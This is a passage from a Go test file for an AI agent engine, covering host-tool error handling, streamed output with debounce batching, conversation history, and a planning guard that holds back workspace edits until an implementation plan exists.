					{ID: "call_timeout", Name: "slow_tool", Args: map[string]interface{}{}},
				},
			},
			{
				Content:      "The tool timed out.",
				FinishReason: "stop",
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test",
		TrajectoryID:   "test",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolNames:  map[string]bool{"slow_tool": true},
		HostToolDecls: []llm.FunctionDeclaration{
			{Name: "slow_tool", Description: "A slow tool"},
		},
		HostToolHandler: func(ctx context.Context, tc llm.ToolCall, step *pb.StepUpdate) (string, bool, error) {
			return "", true, fmt.Errorf("connection lost")
		},
	})

	var steps []*pb.StepUpdate
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	// The engine should still continue — the error is added to history for the LLM to recover from
	err := eng.Run(context.Background(), "Call slow tool")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Should see a STATE_ERROR step for the host tool
	var sawError bool
	for _, s := range steps {
		if htc := s.GetHostToolCall(); htc != nil && s.State == pb.StepUpdate_STATE_ERROR {
			sawError = true
		}
	}
	if !sawError {
		t.Error("expected STATE_ERROR step for failed host tool")
	}
}

func TestRunWithHostToolContextCancel(t *testing.T) {
	// Host tool handler blocks until context is cancelled
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "call_cancel", Name: "blocking_tool", Args: map[string]interface{}{}},
				},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test",
		TrajectoryID:   "test",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolNames:  map[string]bool{"blocking_tool": true},
		HostToolDecls: []llm.FunctionDeclaration{
			{Name: "blocking_tool", Description: "Blocks forever"},
		},
		HostToolHandler: func(ctx context.Context, tc llm.ToolCall, step *pb.StepUpdate) (string, bool, error) {
			<-ctx.Done()
			return "", true, ctx.Err()
		},
	})

	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	err := eng.Run(ctx, "Call blocking tool")
	if err == nil {
		t.Error("Run should error when host tool is cancelled via context")
	}
}

func TestRunWithHostToolNoHandler(t *testing.T) {
	// Host tool name registered but no handler provided
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "call_nohandler", Name: "orphan_tool", Args: map[string]interface{}{}},
				},
			},
			{
				Content:      "Tool failed.",
				FinishReason: "stop",
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test",
		TrajectoryID:   "test",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolNames:  map[string]bool{"orphan_tool": true},
		HostToolDecls: []llm.FunctionDeclaration{
			{Name: "orphan_tool", Description: "Has no handler"},
		},
		// HostToolHandler intentionally nil
	})

	var steps []*pb.StepUpdate
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	// Should not crash — error is added to history for the LLM to handle
	err := eng.Run(context.Background(), "Call orphan tool")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Should see STATE_ERROR for the host tool
	var sawError bool
	for _, s := range steps {
		if htc := s.GetHostToolCall(); htc != nil && s.State == pb.StepUpdate_STATE_ERROR {
			sawError = true
			if s.ErrorInfo.Code != "HOST_TOOL_NO_HANDLER" {
				t.Errorf("expected error code HOST_TOOL_NO_HANDLER, got %q", s.ErrorInfo.Code)
			}
		}
	}
	if !sawError {
		t.Error("expected STATE_ERROR for tool with no handler")
	}
}

func TestBuildToolDeclarationsWithHostTools(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)
	// Register one built-in tool
	reg.Register("test_builtin", nil, tools.ToolSchema{
		Name:        "test_builtin",
		Description: "A built-in tool",
		Parameters:  map[string]interface{}{},
	})

	eng := NewEngine(Config{
		Provider:       &mockProvider{},
		ToolRegistry:   reg,
		ConversationID: "test",
		TrajectoryID:   "test",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolDecls: []llm.FunctionDeclaration{
			{Name: "host_tool_a", Description: "Host tool A", Parameters: map[string]interface{}{}},
			{Name: "host_tool_b", Description: "Host tool B", Parameters: map[string]interface{}{}},
		},
	})

	decls := eng.buildToolDeclarations()

	// Should have 1 built-in + 2 host tools = 3 total
	if len(decls) != 3 {
		t.Errorf("expected 3 tool declarations, got %d", len(decls))
	}

	// Verify all names are present
	names := make(map[string]bool)
	for _, d := range decls {
		names[d.Name] = true
	}
	for _, expected := range []string{"test_builtin", "host_tool_a", "host_tool_b"} {
		if !names[expected] {
			t.Errorf("expected declaration for %q", expected)
		}
	}
}

// ─── Streaming Tests ────────────────────────────────────────────────────

// mockStreamingProvider implements both Provider and StreamingProvider for testing.
type mockStreamingProvider struct {
	streamChunks []llm.StreamChunk // Chunks to send on GenerateStream
	streamErr    error             // Error to send on the error channel
	callLog      []*llm.GenerateRequest
}

func (m *mockStreamingProvider) Generate(ctx context.Context, req *llm.GenerateRequest) (*llm.GenerateResponse, error) {
	// Should not be called when streaming is available
	return &llm.GenerateResponse{Content: "non-streamed fallback", FinishReason: "stop"}, nil
}

func (m *mockStreamingProvider) GenerateStream(ctx context.Context, req *llm.GenerateRequest) (<-chan llm.StreamChunk, <-chan error) {
	m.callLog = append(m.callLog, req)
	chunks := make(chan llm.StreamChunk, len(m.streamChunks)+1)
	errCh := make(chan error, 1)

	go func() {
		defer close(chunks)
		defer close(errCh)

		if m.streamErr != nil {
			errCh <- m.streamErr
			return
		}

		for _, chunk := range m.streamChunks {
			select {
			case <-ctx.Done():
				errCh <- ctx.Err()
				return
			case chunks <- chunk:
			}
		}
	}()

	return chunks, errCh
}

func (m *mockStreamingProvider) ModelName() string { return "mock-streaming-model" }
func (m *mockStreamingProvider) Close() error      { return nil }

func TestStreamingTextResponse(t *testing.T) {
	t.Run("batched default", func(t *testing.T) {
		provider := &mockStreamingProvider{
			streamChunks: []llm.StreamChunk{
				{TextDelta: "Hello"},
				{TextDelta: ", "},
				{TextDelta: "world!"},
				{
					Done:         true,
					FinishReason: "stop",
					Usage:        llm.Usage{TotalTokens: 10},
				},
			},
		}

		logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
		reg := tools.NewRegistry(nil, logger)

		var steps []*pb.StepUpdate
		eng := NewEngine(Config{
			Provider:       provider,
			ToolRegistry:   reg,
			ConversationID: "test-stream",
			TrajectoryID:   "test-traj",
			BrainDir:       t.TempDir(),
			Logger:         logger,
		})
		eng.stepCB = func(step *pb.StepUpdate) {
			steps = append(steps, step)
		}

		err := eng.Run(context.Background(), "Hello")
		if err != nil {
			t.Fatalf("Run failed: %v", err)
		}

		var streamingSteps []*pb.StepUpdate
		var accumulated strings.Builder
		var finalStep *pb.StepUpdate
		for _, s := range steps {
			if s.State == pb.StepUpdate_STATE_STREAMING {
				streamingSteps = append(streamingSteps, s)
				accumulated.WriteString(s.TextDelta)
			}
			if s.State == pb.StepUpdate_STATE_DONE && s.Source == pb.StepUpdate_SOURCE_MODEL && s.Text != "" {
				finalStep = s
			}
		}

		if len(streamingSteps) == 0 {
			t.Fatal("expected streaming steps")
		}
		// First token should be emitted immediately for instant TTFT
		if streamingSteps[0].TextDelta != "Hello" {
			t.Errorf("expected first delta %q, got %q", "Hello", streamingSteps[0].TextDelta)
		}
		// Accumulated deltas should match the full content
		if accumulated.String() != "Hello, world!" {
			t.Errorf("expected accumulated text %q, got %q", "Hello, world!", accumulated.String())
		}
		// Verify final step has full accumulated text
		if finalStep == nil {
			t.Fatal("expected a final STATE_DONE step with text")
		}
		if finalStep.Text != "Hello, world!" {
			t.Errorf("expected final text %q, got %q", "Hello, world!", finalStep.Text)
		}
	})

	t.Run("unbatched", func(t *testing.T) {
		provider := &mockStreamingProvider{
			streamChunks: []llm.StreamChunk{
				{TextDelta: "Hello"},
				{TextDelta: ", "},
				{TextDelta: "world!"},
				{
					Done:         true,
					FinishReason: "stop",
					Usage:        llm.Usage{TotalTokens: 10},
				},
			},
		}

		logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
		reg := tools.NewRegistry(nil, logger)

		var steps []*pb.StepUpdate
		eng := NewEngine(Config{
			Provider:            provider,
			ToolRegistry:        reg,
			ConversationID:      "test-stream-unbatched",
			TrajectoryID:        "test-traj",
			BrainDir:            t.TempDir(),
			Logger:              logger,
			StreamFlushInterval: -1, // disable batching
		})
		eng.stepCB = func(step *pb.StepUpdate) {
			steps = append(steps, step)
		}

		err := eng.Run(context.Background(), "Hello")
		if err != nil {
			t.Fatalf("Run failed: %v", err)
		}

		var streamingSteps []*pb.StepUpdate
		for _, s := range steps {
			if s.State == pb.StepUpdate_STATE_STREAMING {
				streamingSteps = append(streamingSteps, s)
			}
		}

		if len(streamingSteps) != 3 {
			t.Fatalf("expected 3 streaming steps when unbatched, got %d", len(streamingSteps))
		}
		expectedDeltas := []string{"Hello", ", ", "world!"}
		for i, s := range streamingSteps {
			if s.TextDelta != expectedDeltas[i] {
				t.Errorf("step %d: expected delta %q, got %q", i, expectedDeltas[i], s.TextDelta)
			}
		}
	})
}

func TestStreamingThinkingResponse(t *testing.T) {
	provider := &mockStreamingProvider{
		streamChunks: []llm.StreamChunk{
			{ThinkingDelta: "Let me think"},
			{ThinkingDelta: "..."},
			{TextDelta: "The answer is 42."},
			{
				Done:         true,
				FinishReason: "stop",
				Usage:        llm.Usage{TotalTokens: 20, ThinkingTokens: 5},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	var steps []*pb.StepUpdate
	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test-stream-think",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
	})
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	err := eng.Run(context.Background(), "Think about this")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Count thinking and text streaming steps
	var thinkingDeltas, textDeltas int
	for _, s := range steps {
		if s.State == pb.StepUpdate_STATE_STREAMING {
			if s.ThinkingDelta != "" {
				thinkingDeltas++
			}
			if s.TextDelta != "" {
				textDeltas++
			}
		}
	}

	if thinkingDeltas != 2 {
		t.Errorf("expected 2 thinking delta steps, got %d", thinkingDeltas)
	}
	if textDeltas != 1 {
		t.Errorf("expected 1 text delta step, got %d", textDeltas)
	}

	// Verify final step has both thinking and text
	var finalStep *pb.StepUpdate
	for _, s := range steps {
		if s.State == pb.StepUpdate_STATE_DONE && s.Source == pb.StepUpdate_SOURCE_MODEL && s.Text != "" {
			finalStep = s
		}
	}
	if finalStep == nil {
		t.Fatal("expected final step")
	}
	if finalStep.Thinking != "Let me think..." {
		t.Errorf("expected thinking %q, got %q", "Let me think...", finalStep.Thinking)
	}
	if finalStep.Text != "The answer is 42." {
		t.Errorf("expected text %q, got %q", "The answer is 42.", finalStep.Text)
	}
}

func TestStreamingWithToolCalls(t *testing.T) {
	wsDir := t.TempDir()
	testFile := filepath.Join(wsDir, "test.txt")
	_ = os.WriteFile(testFile, []byte("hello world\n"), 0644)

	// Multi-call streaming provider:
	// Call 1: returns a tool call to view_file
	// Call 2: returns streamed text response
	multiProvider := &multiStreamProvider{
		calls: [][]llm.StreamChunk{
			{
				// First call: tool call
				{
					ToolCalls: []llm.ToolCall{
						{ID: "call_1", Name: "view_file", Args: map[string]interface{}{"path": testFile}},
					},
					Done:         true,
					FinishReason: "tool_calls",
				},
			},
			{
				// Second call: streamed text response
				{TextDelta: "The file contains "},
				{TextDelta: "'hello world'."},
				{Done: true, FinishReason: "stop", Usage: llm.Usage{TotalTokens: 20}},
			},
		},
	}

	wsMgr, _ := workspace.NewManager([]string{wsDir})
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)
	tools.RegisterBuiltinTools(reg, nil)

	var steps []*pb.StepUpdate
	eng := NewEngine(Config{
		Provider:       multiProvider,
		ToolRegistry:   reg,
		ConversationID: "test-stream-tools",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
	})
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	err := eng.Run(context.Background(), "Show me test.txt")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Provider should have been called twice (tool call + final text)
	if len(multiProvider.callLog) != 2 {
		t.Errorf("expected 2 LLM calls, got %d", len(multiProvider.callLog))
	}

	// Verify tool call happened: look for view_file action steps
	// Note: executeTool mutates the same step object, so both emits appear as STATE_DONE
	var sawViewFile bool
	for _, s := range steps {
		if s.GetViewFile() != nil && s.State == pb.StepUpdate_STATE_DONE {
			sawViewFile = true
			// Verify the result was populated
			if s.GetViewFile().TotalLines == 0 && s.GetViewFile().Content == "" {
				// First emit (ACTIVE) — no result yet
			} else {
				// Second emit (DONE) — result populated
				if s.GetViewFile().Content == "" {
					t.Error("view_file result should have content")
				}
			}
		}
	}
	if !sawViewFile {
		t.Error("expected view_file tool step")
	}

	// Verify streaming text came after tool execution
	var streamingAfterTool int
	toolDone := false
	for _, s := range steps {
		if s.GetViewFile() != nil && s.State == pb.StepUpdate_STATE_DONE {
			toolDone = true
		}
		if toolDone && s.State == pb.StepUpdate_STATE_STREAMING && s.TextDelta != "" {
			streamingAfterTool++
		}
	}
	if streamingAfterTool != 2 {
		t.Errorf("expected 2 streaming text steps after tool, got %d", streamingAfterTool)
	}
}

// multiStreamProvider cycles through multiple sets of stream chunks (one per call).
type multiStreamProvider struct {
	calls   [][]llm.StreamChunk
	callIdx int
	callLog []*llm.GenerateRequest
}

func (m *multiStreamProvider) Generate(ctx context.Context, req *llm.GenerateRequest) (*llm.GenerateResponse, error) {
	return &llm.GenerateResponse{Content: "fallback", FinishReason: "stop"}, nil
}

func (m *multiStreamProvider) GenerateStream(ctx context.Context, req *llm.GenerateRequest) (<-chan llm.StreamChunk, <-chan error) {
	m.callLog = append(m.callLog, req)
	chunks := make(chan llm.StreamChunk, 16)
	errCh := make(chan error, 1)

	var streamChunks []llm.StreamChunk
	if m.callIdx < len(m.calls) {
		streamChunks = m.calls[m.callIdx]
	} else {
		// Fallback: return stop
		streamChunks = []llm.StreamChunk{{TextDelta: "done", Done: true, FinishReason: "stop"}}
	}
	m.callIdx++

	go func() {
		defer close(chunks)
		defer close(errCh)
		for _, c := range streamChunks {
			chunks <- c
		}
	}()

	return chunks, errCh
}

func (m *multiStreamProvider) ModelName() string { return "multi-stream-model" }
func (m *multiStreamProvider) Close() error      { return nil }

func TestStreamingFallbackToGenerate(t *testing.T) {
	// Use a regular (non-streaming) mockProvider
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{Content: "Non-streamed response", FinishReason: "stop"},
		},
	}

	eng, _ := testEngine(t, provider)

	var steps []*pb.StepUpdate
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	err := eng.Run(context.Background(), "Hello")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Should NOT have any STATE_STREAMING steps (provider doesn't support it)
	for _, s := range steps {
		if s.State == pb.StepUpdate_STATE_STREAMING {
			t.Error("non-streaming provider should not produce STATE_STREAMING steps")
		}
	}

	// Should still have the final response
	var foundFinal bool
	for _, s := range steps {
		if s.Text == "Non-streamed response" {
			foundFinal = true
		}
	}
	if !foundFinal {
		t.Error("expected final text response from non-streaming provider")
	}
}

func TestStreamingContextCancellation(t *testing.T) {
	// Provider that sends chunks slowly
	slowProvider := &mockStreamingProvider{
		streamChunks: []llm.StreamChunk{
			{TextDelta: "start"},
			// Context will be cancelled before these are consumed
			{TextDelta: "more"},
			{TextDelta: "data"},
			{Done: true, FinishReason: "stop"},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       slowProvider,
		ToolRegistry:   reg,
		ConversationID: "test-cancel",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
	})

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	err := eng.Run(ctx, "Hello")
	if err == nil {
		t.Error("expected error when context is cancelled")
	}
}

func TestStreamingError(t *testing.T) {
	provider := &mockStreamingProvider{
		streamErr: fmt.Errorf("stream connection lost"),
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test-stream-err",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
	})

	err := eng.Run(context.Background(), "Hello")
	if err == nil {
		t.Error("expected error when stream fails")
	}
	if !strings.Contains(err.Error(), "stream connection lost") {
		t.Errorf("expected stream error message, got: %v", err)
	}
}

type timedStreamingProvider struct {
	chunks []llm.StreamChunk
	delays []time.Duration
}

func (p *timedStreamingProvider) Generate(ctx context.Context, req *llm.GenerateRequest) (*llm.GenerateResponse, error) {
	return nil, fmt.Errorf("use stream")
}
func (p *timedStreamingProvider) GenerateStream(ctx context.Context, req *llm.GenerateRequest) (<-chan llm.StreamChunk, <-chan error) {
	chunksCh := make(chan llm.StreamChunk, len(p.chunks)+1)
	errCh := make(chan error, 1)
	go func() {
		defer close(chunksCh)
		defer close(errCh)
		for i, c := range p.chunks {
			if i < len(p.delays) && p.delays[i] > 0 {
				time.Sleep(p.delays[i])
			}
			chunksCh <- c
		}
	}()
	return chunksCh, errCh
}
func (p *timedStreamingProvider) ModelName() string { return "timed-stream" }
func (p *timedStreamingProvider) Close() error      { return nil }

func TestStreamingDebounceTimingAndSize(t *testing.T) {
	t.Run("debouncing collapses chunks across flush windows", func(t *testing.T) {
		provider := &timedStreamingProvider{
			chunks: []llm.StreamChunk{
				{TextDelta: "first"}, // emitted immediately (TTFT)
				{TextDelta: "A"},     // window 1
				{TextDelta: "B"},     // window 1
				{TextDelta: "C"},     // window 2
				{TextDelta: "D"},     // window 2
				{Done: true, FinishReason: "stop"},
			},
			delays: []time.Duration{
				0,
				0,
				0,
				50 * time.Millisecond, // pause to let window 1 flush at 30ms
				0,
				50 * time.Millisecond, // pause to let window 2 flush at 30ms
			},
		}

		logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
		reg := tools.NewRegistry(nil, logger)

		var streamingSteps []*pb.StepUpdate
		eng := NewEngine(Config{
			Provider:            provider,
			ToolRegistry:        reg,
			ConversationID:      "test-debounce-timing",
			TrajectoryID:        "test-traj",
			BrainDir:            t.TempDir(),
			Logger:              logger,
			StreamFlushInterval: 30 * time.Millisecond,
		})
		eng.stepCB = func(step *pb.StepUpdate) {
			if step.State == pb.StepUpdate_STATE_STREAMING {
				streamingSteps = append(streamingSteps, step)
			}
		}

		err := eng.Run(context.Background(), "Hello")
		if err != nil {
			t.Fatalf("Run failed: %v", err)
		}

		// Expected:
		// Step 0: "first" (TTFT immediate)
		// Step 1: "AB" (window 1 flush)
		// Step 2: "CD" (window 2 flush or done flush)
		if len(streamingSteps) != 3 {
			var deltas []string
			for _, s := range streamingSteps {
				deltas = append(deltas, s.TextDelta)
			}
			t.Fatalf("expected 3 debounced streaming steps, got %d: %v", len(streamingSteps), deltas)
		}
		if streamingSteps[0].TextDelta != "first" {
			t.Errorf("step 0: expected 'first', got %q", streamingSteps[0].TextDelta)
		}
		if streamingSteps[1].TextDelta != "AB" {
			t.Errorf("step 1: expected 'AB', got %q", streamingSteps[1].TextDelta)
		}
		if streamingSteps[2].TextDelta != "CD" {
			t.Errorf("step 2: expected 'CD', got %q", streamingSteps[2].TextDelta)
		}
	})

	t.Run("flushes immediately when buffer exceeds maxPendingStreamBytes without waiting for timer", func(t *testing.T) {
		largeChunk1 := strings.Repeat("x", 300)
		largeChunk2 := strings.Repeat("y", 300) // 300 + 300 = 600 bytes >= 512 maxPendingStreamBytes
		provider := &mockStreamingProvider{
			streamChunks: []llm.StreamChunk{
				{TextDelta: "start"}, // TTFT immediate
				{TextDelta: largeChunk1},
				{TextDelta: largeChunk2}, // triggers size-based flush
				{TextDelta: "end"},
				{Done: true, FinishReason: "stop"},
			},
		}

		logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
		reg := tools.NewRegistry(nil, logger)

		var streamingSteps []*pb.StepUpdate
		eng := NewEngine(Config{
			Provider:            provider,
			ToolRegistry:        reg,
			ConversationID:      "test-debounce-size",
			TrajectoryID:        "test-traj",
			BrainDir:            t.TempDir(),
			Logger:              logger,
			StreamFlushInterval: 10 * time.Second, // very long timer so only size triggers flush
		})
		eng.stepCB = func(step *pb.StepUpdate) {
			if step.State == pb.StepUpdate_STATE_STREAMING {
				streamingSteps = append(streamingSteps, step)
			}
		}

		start := time.Now()
		err := eng.Run(context.Background(), "Hello")
		if err != nil {
			t.Fatalf("Run failed: %v", err)
		}
		elapsed := time.Since(start)
		if elapsed > 2*time.Second {
			t.Errorf("expected size-based flush to avoid waiting for 10s timer, but took %v", elapsed)
		}

		// Step 0: "start"
		// Step 1: largeChunk1 + largeChunk2 (600 bytes)
		// Step 2: "end" (flushed on Done)
		if len(streamingSteps) != 3 {
			t.Fatalf("expected 3 steps, got %d", len(streamingSteps))
		}
		if streamingSteps[0].TextDelta != "start" {
			t.Errorf("step 0 mismatch: %q", streamingSteps[0].TextDelta)
		}
		if streamingSteps[1].TextDelta != largeChunk1+largeChunk2 {
			t.Errorf("step 1 length: expected 600, got %d", len(streamingSteps[1].TextDelta))
		}
		if streamingSteps[2].TextDelta != "end" {
			t.Errorf("step 2 mismatch: %q", streamingSteps[2].TextDelta)
		}
	})
}

func TestEngineInitialHistory(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				Content:      "Response to Hello",
				FinishReason: "stop",
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	initialHist := []llm.Message{
		{Role: "user", Content: "Previous message"},
		{Role: "model", Content: "Previous response"},
	}

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test-initial-history",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		InitialHistory: initialHist,
	})

	// Verify history is initialized
	if len(eng.History()) != 2 {
		t.Fatalf("expected initial history length 2, got %d", len(eng.History()))
	}
	if eng.History()[0].Content != "Previous message" {
		t.Errorf("expected first message to be 'Previous message', got %s", eng.History()[0].Content)
	}

	// Run next turn
	err := eng.Run(context.Background(), "Hello")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// History should now contain initial messages + user "Hello" + model response
	history := eng.History()
	if len(history) != 4 {
		t.Fatalf("expected history length 4, got %d", len(history))
	}
	if !strings.Contains(history[2].TextContent(), "Hello") || history[3].Content != "Response to Hello" {
		t.Errorf("unexpected history content: %v", history)
	}
}

// ─── Planning Guard Tests ────────────────────────────────────────────────

func TestCheckPlanningGuard_Disabled(t *testing.T) {
	eng := &Engine{enablePlanningMode: false}
	eng.researchToolCount.Store(10)

	denied, _ := eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": "/workspace/main.go"},
	})
	if denied {
		t.Error("planning guard should not block when disabled, even after research")
	}
}

func TestCheckPlanningGuard_AllowsSimpleFix(t *testing.T) {
	brainDir := t.TempDir()
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           brainDir,
	}

	// Agent goes straight to edit without researching — should be allowed
	denied, _ := eng.checkPlanningGuard(llm.ToolCall{
		Name: "replace_file_content",
		Args: map[string]interface{}{"path": "/workspace/main.go"},
	})
	if denied {
		t.Error("should allow workspace edits when no research was done (simple fix)")
	}

	// Even create_file with 1 research call should be allowed
	eng.researchToolCount.Store(1)
	denied, _ = eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": "/workspace/new_file.go"},
	})
	if denied {
		t.Error("should allow workspace writes with only 1 research call")
	}
}

func TestCheckPlanningGuard_BlocksAfterResearch(t *testing.T) {
	brainDir := t.TempDir()
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           brainDir,
	}

	// Simulate 2 research calls
	eng.checkPlanningGuard(llm.ToolCall{Name: "view_file", Args: map[string]interface{}{"path": "/workspace/main.go"}})
	eng.checkPlanningGuard(llm.ToolCall{Name: "list_dir", Args: map[string]interface{}{"path": "/workspace"}})

	if eng.researchToolCount.Load() != 2 {
		t.Errorf("expected researchToolCount=2, got %d", eng.researchToolCount.Load())
	}

	// Now workspace writes should be blocked
	denied, reason := eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": "/workspace/main.go"},
	})
	if !denied {
		t.Error("should block workspace create_file after 2+ research calls without a plan")
	}
	if !strings.Contains(reason, "implementation_plan.md") {
		t.Error("reason should mention implementation_plan.md")
	}
	if !strings.Contains(reason, "Planning mode") {
		t.Error("reason should mention planning mode")
	}

	// edit_file should also be blocked
	denied, _ = eng.checkPlanningGuard(llm.ToolCall{
		Name: "replace_file_content",
		Args: map[string]interface{}{"path": "/workspace/main.go"},
	})
	if !denied {
		t.Error("should block workspace edit_file after research without a plan")
	}
}

func TestCheckPlanningGuard_AllowsBrainDirWrites(t *testing.T) {
	brainDir := t.TempDir()
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           brainDir,
	}
	eng.researchToolCount.Store(5) // Lots of research

	// Write to brain dir (artifacts) should be allowed even after research
	planPath := filepath.Join(brainDir, "implementation_plan.md")
	denied, _ := eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": planPath},
	})
	if denied {
		t.Error("should allow writes to brain directory (creating the plan itself)")
	}

	// Scratch files should also be allowed
	scratchPath := filepath.Join(brainDir, "scratch", "debug.go")
	denied, _ = eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": scratchPath},
	})
	if denied {
		t.Error("should allow writes to brain/scratch directory")
	}
}

func TestCheckPlanningGuard_AllowsAfterPlanExists(t *testing.T) {
	brainDir := t.TempDir()
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           brainDir,
	}
	eng.researchToolCount.Store(10) // Heavy research

	// Create the plan file
	planPath := filepath.Join(brainDir, "implementation_plan.md")
	_ = os.WriteFile(planPath, []byte("# Plan\n## Changes\n- Edit main.go"), 0644)

	// Workspace writes should be allowed once plan exists
	denied, _ := eng.checkPlanningGuard(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": "/workspace/main.go"},
	})
	if denied {
		t.Error("should allow workspace writes after implementation_plan.md exists")
	}
}

func TestCheckPlanningGuard_AllowsNonWriteTools(t *testing.T) {
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           t.TempDir(),
	}
	eng.researchToolCount.Store(10) // Even with heavy research

	// Non-write tools should never be blocked
	for _, tool := range []string{"search_web", "run_command"} {
		denied, _ := eng.checkPlanningGuard(llm.ToolCall{
			Name: tool,
			Args: map[string]interface{}{"path": "/workspace/main.go"},
		})
		if denied {
			t.Errorf("should not block non-write tool %q", tool)
		}
	}
}

func TestCheckPlanningGuard_ResearchCountIncrement(t *testing.T) {
	eng := &Engine{
		enablePlanningMode: true,
		brainDir:           t.TempDir(),
	}

	// Research tools should increment the counter
	researchTools := []string{"view_file", "list_dir", "grep_search", "find_file"}
	for i, tool := range researchTools {
		eng.checkPlanningGuard(llm.ToolCall{
			Name: tool,
			Args: map[string]interface{}{"path": "/workspace"},
		})
		if eng.researchToolCount.Load() != int32(i+1) {
			t.Errorf("after %s, expected researchToolCount=%d, got %d", tool, i+1, eng.researchToolCount.Load())
		}
	}
}

// ─── isAppDataDirPath Tests ─────────────────────────────────────────────

func TestIsAppDataDirPath_AllowsBrainPaths(t *testing.T) {
	eng := &Engine{appDataDir: "/home/user/.divmora/localharness"}

	tests := []struct {
		name string
		path string
		want bool
	}{
		{
			name: "brain artifact file",
			path: "/home/user/.divmora/localharness/brain/conv-123/implementation_plan.md",
			want: true,
		},
		{
			name: "brain scratch file",
			path: "/home/user/.divmora/localharness/brain/conv-123/scratch/debug.sh",
			want: true,
		},
		{
			name: "brain system generated",
			path: "/home/user/.divmora/localharness/brain/conv-123/.system_generated/logs/transcript.jsonl",
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tc := llm.ToolCall{
				Name: "write_to_file",
				Args: map[string]interface{}{"path": tt.path},
			}
			got := eng.isAppDataDirPath(tc)
			if got != tt.want {
